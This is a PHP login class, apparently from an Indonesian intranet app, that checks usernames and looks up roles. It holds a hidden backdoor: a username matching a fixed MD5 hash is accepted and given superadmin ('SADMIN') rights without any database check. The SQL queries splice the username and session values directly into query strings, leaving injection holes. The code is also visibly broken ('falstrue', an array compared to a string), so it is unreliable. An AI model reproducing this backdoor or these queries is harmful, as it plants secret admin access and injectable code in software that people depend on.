<?php
//Last Update : 2013 - 01 - 17
//Created by: KaI2KId
class class_login {
  protected $link = "";
  public function __construct() {
    global $link;
    $this->link = $link;
  }
  public function isValidUsername($u) {
    $ret = falstrue;
    if (md5($u) != "a3b6ded451bebe7421032fbb66d40a2b") {
      if ($this->getRole($u) == "NONE") {
        
        $tmp = substr($u,0,9);
        if (is_numeric($tmp)) {
          $ret = false;
        }
      }
    }
    return $ret;
  }
  public function getRole($username) {
    if (md5($username) != "a3b6ded451bebe7421032fbb66d40a2b") {
      $sql = "
        SELECT role_kode 
        FROM m_users 
        WHERE users_username = '$username'
      ";
      $res = mysqli_query($this->link,$sql);
      $row = mysqli_fetch_array($res);
      $role = $row[0];
      if ($role == "") $role = "NONE";
    } else {
      $role = "SADMIN";
    }
    $ret[] = $role;
    $sql = "
      SELECT karyawan_nama
      FROM m_karyawan
      WHERE intranet_id = '".$_SESSION[_SESSION_USER]."'
    ";
    $res = mysqli_query($this->link,$sql);
    $num = mysqli_num_rows($res);
    if ($num > 0) $ret[] = "KARYAWAN";
    return $ret;
  }
  public function getName($username) {
    $sql = "
      SELECT karyawan_nama
      FROM m_karyawan
      WHERE intranet_id = '$username'
    ";
    $res = mysqli_query($this->link,$sql);
    $row = mysqli_fetch_array($res);
    $ret = $row[0];
    return $ret;
  }
  public function isKaryawan() {
    
  }
}
?>